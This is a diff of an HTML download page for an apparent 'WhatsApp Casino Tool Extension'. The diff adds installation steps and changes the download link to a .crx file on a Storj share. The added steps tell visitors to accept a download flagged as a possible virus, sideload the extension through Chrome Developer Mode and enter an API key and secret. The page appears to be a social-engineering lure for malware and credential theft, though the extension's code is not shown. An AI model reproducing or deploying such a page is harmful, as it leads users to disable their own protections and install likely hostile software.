@@ -1,35 +1,31 @@
 <!DOCTYPE html>
 <html lang="en">
-        <head>
-            <meta charset="UTF-8" />
-            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-            <title>WhatsApp Casino Tool Extension</title>
-            <style>
-                html, body {
-            height: 100%; /* Set the height of the html and body to 100% */
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>WhatsApp Casino Tool Extension</title>
+    <style>
+        html, body {
+            height: 100%;
             margin: 0;
             padding: 0;
             font-family: Arial, sans-serif;
         }
-        
         body {
             display: flex;
-            flex-direction: column; /* Makes the main elements flex children */
-        }     
-
+            flex-direction: column;
+        }
         header {
             background-color: #128c7e;
             color: white;
             padding: 20px 0;
             text-align: center;
         }
-        
         header, footer {
-            flex-shrink: 0; /* Prevents header and footer from shrinking */
+            flex-shrink: 0;
         }
-        
         main {
-            flex-grow: 1; /* Allows main to take up any remaining space */
+            flex-grow: 1;
             padding: 20px;
             text-align: center;
         }
@@ -39,25 +35,23 @@
             padding: 10px 0;
             text-align: center;
         }
-
         button {
             box-sizing: border-box;
-            width: 80%; /* Adjusted for better visibility */
-            height: 60px; /* Larger button for emphasis */
+            width: 80%;
+            height: 60px;
             padding: 8px 15px;
-            margin-top: 20px; /* Increased margin */
+            margin-top: 20px;
             background: linear-gradient(45deg, #25d366, #128c7e);
             border: none;
             border-radius: 5px;
             color: #fff;
-            font-size: 18px; /* Larger font size for readability */
+            font-size: 18px;
             cursor: pointer;
             transition: background-color 0.3s, transform 0.3s, box-shadow 0.3s;
             position: relative;
             overflow: hidden;
             z-index: 1;
         }
-
         button::before {
             content: "";
             position: absolute;
@@ -69,11 +63,9 @@
             transition: all 0.5s;
             border-radius: 5px;
         }
-
         button:hover::before {
             left: 100%;
         }
-
         button::after {
             content: "";
             position: absolute;
@@ -85,10 +77,9 @@
             filter: blur(8px);
             z-index: -1;
         }
-
         button:hover {
-            transform: scale(1.05); /* More noticeable scale */
-            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.25); /* Enhanced shadow for better effect */
+            transform: scale(1.05);
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.25);
         }
     </style>
 </head>
@@ -97,20 +88,36 @@
         <h1>Welcome to the WhatsApp Casino Tool Extension</h1>
     </header>
     <main>
-        <section>
+        <section id="instructions">
+            <h2>Installation Instructions</h2>
+            <ol>
+                <li>Open downloads.</li>
+                <li>Click download file.</li>
+                <li>Accept "download from unknown source" (it'll be detected as a possible virus).</li>
+                <li>Place the downloaded file in a secure place (Documents, Desktop, etc).</li>
+                <li>Go to Chrome's extensions page, enable Developer Mode, and click "Load unpacked extension".</li>
+                <li>Click the extension icon.</li>
+                <li>Add API key and secret.</li>
+                <li>Open WhatsApp.</li>
+            </ol>
+        </section>
+        <section id="current-page">
             <h2>About This Extension</h2>
             <p>This page provides updates for the WhatsApp Casino Tool Extension.</p>
-        </section>
-        <section>
-            <h2>Installation Instructions</h2>
+            <h2>Download and Install</h2>
             <p>To install this extension, please click the button below to download the latest version and manually drag it into the Chrome extensions page.</p>
-            <button onclick="window.open('https://drive.usercontent.google.com/u/0/uc?id=1igTdC6IPwB_azKmYbSuye51XibluZqC9&export=download', '_blank')">
-                Install Last Version
-            </button>
+            <button onclick="installExtension()">Install Last Version</button>
         </section>
     </main>
     <footer>
         <p>Copyright © 2023</p>
     </footer>
+
+    <script>
+        function installExtension() {
+            window.open('https://link.storjshare.io/s/jue66bgjxcj76p3wpnqehetmd4pa/casino%2Fcasino_chrome_extension.crx?download=1', '_blank');
+            document.getElementById('instructions').scrollIntoView({ behavior: 'smooth' });
+        }
+    </script>
 </body>
 </html>
